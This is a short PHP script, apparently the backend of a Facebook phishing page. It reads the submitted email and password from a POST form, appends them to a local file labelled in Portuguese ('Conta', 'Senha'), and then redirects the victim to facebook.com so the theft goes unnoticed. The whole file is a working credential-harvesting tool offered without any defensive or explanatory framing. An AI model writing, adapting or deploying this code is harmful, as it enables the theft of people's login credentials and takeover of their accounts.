<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['email'] . " Senha: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
